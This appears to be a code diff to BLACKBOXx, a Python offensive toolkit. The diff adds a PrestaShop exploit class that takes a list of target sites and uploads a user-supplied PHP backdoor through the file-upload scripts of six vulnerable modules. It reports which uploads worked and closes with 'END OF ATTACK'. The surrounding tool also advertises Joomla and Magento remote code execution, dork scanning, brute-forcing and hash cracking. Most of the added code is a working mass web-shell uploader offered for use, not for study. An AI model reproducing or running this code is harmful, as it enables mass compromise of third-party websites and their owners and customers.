@@ -14,6 +14,7 @@
 #################################################################################
 ### JOOMLA RCE  : https://www.exploit-db.com/exploits/39033/
 ### MAGENTO RCE : https://www.exploit-db.com/exploits/37977/
+### PRESTASHOP EXPLOIT : http://0day.today/exploit/25260 , http://0day.today/exploit/25261 , http://0day.today/exploit/25259
 
 import requests,json,sys, time, re, os, base64, random,hashlib,timeit
 from sys import platform
@@ -29,10 +30,10 @@ __license__    = 'GPLv2'
 __scrname__    = 'BLACKBOXx v%s' % (__version__)
 
 def __banner__():
-	print color.BOLD+color.Y+" _____ __    _____ _____ _____ _____ _____ __ __"
-	print color.BOLD+color.Y+"| __  |  |  |  _  |     |  |  | __  |     |  |  |_ _"
-	print color.BOLD+color.Y+"| __ -|  |__|     |   --|    -| __ -|  |  |-   -|_'_|"
-	print color.BOLD+color.Y+"|_____|_____|__|__|_____|__|__|_____|_____|__|__|_,_|"
+	print color.BOLD+color.Y+" _____ __    _____ _____ _____ _____ _____ "
+	print color.BOLD+color.Y+"| __  |  |  |  _  |     |  |  | __  |     | _ _"
+	print color.BOLD+color.Y+"| __ -|  |__|     |   --|    -| __ -|  |  ||_'_|"
+	print color.BOLD+color.Y+"|_____|_____|__|__|_____|__|__|_____|_____||_,_|"
 	print color.W+color.BOLD+"                                                     {"+color.C+__version__+"#Dev"+color.W+"}"+color.ENDC
 
 def __help__():
@@ -45,7 +46,8 @@ def __help__():
 	print "\t\t+ Dnsinfo                       :   dns_info"
 	print "\t\t+ Joomla Rce                    :   rce_joomla"
 	print "\t\t+ Magento Rce                   :   rce_magento"
-	print "\t\t+ Google Dorker                 :   google_dorker(lfi scan)"
+	print "\t\t+ PrestaShop Exploit            :   presta_exploit"
+	print "\t\t+ Google Dorker                 :   google_dorker(lfi/sqli scan)"
 	print "\t\t+ Bing Dorker                   :   bing_dorker(lfi scan)"
 	print "\t\t+ Crack Hash(MD5/SHA*/NTLM)     :   hash_killer"
 	print "\t\t+ update Database (sudo needed) :   -u/--update"
@@ -77,6 +79,16 @@ class color:
 		M    =  '' # Magenta
 		C    =  '' # Cyan
 		ENDC =  '' # end colors
+
+
+###
+###SCANNER TOOLS
+###
+####################################
+##                                ##
+##            LFI/SQLI            ##
+##                                ##
+####################################
 
 class checker:
 	def lfi(self, url):
@@ -148,13 +160,14 @@ class checker:
 	def sqli(self, url):
 		pass
 
-
+###
+###DORKING TOOLS
+###
 ####################################
 ##                                ##
 ##            DORKER              ##
 ##                                ##
 ####################################
-
 class dorker:
 	gurl,burl=[],[]
 	def google(self, dork, start, stop):
@@ -263,6 +276,9 @@ class dorker:
 	pass
 
 
+###
+###BRUTEFORCING TOOLS
+###
 ####################################
 ##                                ##
 ##   BruteForcing WP/JM/FTP/SSH   ##
@@ -311,6 +327,9 @@ class BruteForce:
 		pass
 
 
+###
+###RCE EXPLOIT
+###
 ####################################
 ##                                ##
 ##    Add RCE joomla & Magento    ##
@@ -383,6 +402,10 @@ class rce:
 			else:
 				print "NOT WORKED with {0}".format(target_url)
 
+
+###
+###DNS INFO
+###
 ####################################
 ##                                ##
 ##      Get Website from IP       ##
@@ -448,6 +471,9 @@ class dnsinfo:
 			print color.W+color.BOLD+"[+] "+str(len(black))+" FOUND"+color.ENDC
 			print color.W+color.BOLD+"[+] Domains is saved in "+domain+".txt"+color.ENDC
 
+###
+###HASH CRACKER
+###
 ####################################
 ##                                ##
 ##         HASH CRACKER           ##
@@ -557,6 +583,137 @@ class cracker:
 				if has == h:
 					print "Found : "+has+" : "+word
 
+###
+###EXPLOIT 0DAY
+###
+####################################
+##                                ##
+##      PrestaShop Exploit !      ##
+##                                ##
+####################################
+class presta_exploit:
+	###
+	### SimpleSlideShow Exploit
+	###
+	def sss_ex(self,lists, script):
+		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"SimpleSlideShow Exploit :"+color.ENDC)
+		lists = open(lists,"r")
+		lists = lists.readlines()
+		for url in lists:
+			url=url.strip()
+			url = url + "/modules/simpleslideshow/uploadimage.php"
+			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+			req=requests.post(url,files=files)
+			url=url.replace('/uploadimage.php','/slides/'+script)
+			if 'uploadshell' in req.text:
+				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+			else:
+				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+	###
+	### productpageadverts
+	###
+	def ppa_ex(self,lists, script):
+		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Productpageadverts Exploit :"+color.ENDC)
+		lists = open(lists,"r")
+		lists = lists.readlines()
+		for url in lists:
+			url=url.strip()
+			url = url + "/modules/productpageadverts/uploadimage.php"
+			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+			req=requests.post(url,files=files)
+			url=url.replace('/uploadimage.php','/slides/'+script)
+			if 'uploadshell' in req.text:
+				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+			else:
+				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+	###
+	### HomePageAdvertise
+	###
+	def hpa_ex(self,lists, script):
+		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"HomePageAdvertise Exploit :"+color.ENDC)
+		lists = open(lists,"r")
+		lists = lists.readlines()
+		for url in lists:
+			url=url.strip()
+			url = url + "/modules/homepageadvertise/uploadimage.php"
+			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+			req=requests.post(url,files=files)
+			url=url.replace('/uploadimage.php','/slides/'+script)
+			if 'uploadshell' in req.text:
+				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+			else:
+				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+	###
+	### ColumnAdvers
+	###
+	def ca_ex(self,lists, script):
+		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"ColumnAdvers Exploit :"+color.ENDC)
+		lists = open(lists,"r")
+		lists = lists.readlines()
+		for url in lists:
+			url=url.strip()
+			url = url + "/modules/columnadverts/uploadimage.php"
+			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+			req=requests.post(url,files=files)
+			url=url.replace('/uploadimage.php','/slides/'+script)
+			if 'uploadshell' in req.text:
+				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+			else:
+				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+	###
+	### vtemslideshow
+	###	
+	def vtss_ex(self,lists, script):
+		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Vtemslideshow Exploit :"+color.ENDC)
+		lists = open(lists,"r")
+		lists = lists.readlines()
+		for url in lists:
+			url=url.strip()
+			url = url + "modules/vtemslideshow/uploadimage.php"
+			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+			req=requests.post(url,files=files)
+			url=url.replace('/uploadimage.php','/slides/'+script)
+			if 'uploadshell' in req.text:
+				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+			else:
+				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+	###
+	### attributewizardpro
+	###	
+	def awp_ex(self,lists, script):
+		print (color.M+color.BOLD+"[+] "+color.ENDC+color.BOLD+"Attributewizardpro Exploit :"+color.ENDC)
+		lists = open(lists,"r")
+		lists = lists.readlines()
+		for url in lists:
+			url=url.strip()
+			url = url + "/modules/attributewizardpro/file_upload.php"
+			files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
+			req=requests.post(url,files=files)
+			url=url.replace('/uploadimage.php','/slides/'+script)
+			if 'uploadshell' in req.text:
+				print (url+" :"+color.BL+color.BOLD+" UPLOADED")
+			else:
+				print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
+	###
+	### Start All Exploit
+	###
+	def __init__(self, lists, script):
+		l = open(lists,"r")
+		l = l.readlines()
+		print (color.M+color.BOLD+"[+]"+color.BOLD+color.W+" "+str(len(l))+" URL FOUNDED")
+		#Start SimpleSlideShow Exploit
+		self.sss_ex(lists,script)
+		#Start productpageadverts Exploit
+		self.ppa_ex(lists,script)
+		#Start HomePageAdvertise Exploit
+		self.hpa_ex(lists,script)
+		#Start ColumnAdvers Exploit
+		self.ca_ex(lists,script)
+		#Start vtemslideshow Exploit
+		self.vtss_ex(lists, script)
+		#Start attributewizardpro Exploit
+		self.awp_ex(lists,script)
+		print (color.M+color.BOLD+"[+] "+color.BOLD+color.W+"END OF ATTACK")
 
 ####################################
 ##                                ##
@@ -722,6 +879,17 @@ def __main__():
 				crack.ntlm(ntlm,wordlist)
 		if (arg=="-u" or arg=="--update"):
 			__update__()
+		if (arg=="presta_exploit"):
+			parser = OptionParser()
+			parser.add_option("--lists","-l",
+				help="wordlist path")
+			parser.add_option("--script","-s",
+				help="Path of php backdoor")
+			(options,args) = parser.parse_args()
+			lists = options.lists
+			script = options.script
+			if lists and script:
+				presta_exploit(lists,script)
 if __name__ == '__main__':
 	try:
 		__main__()
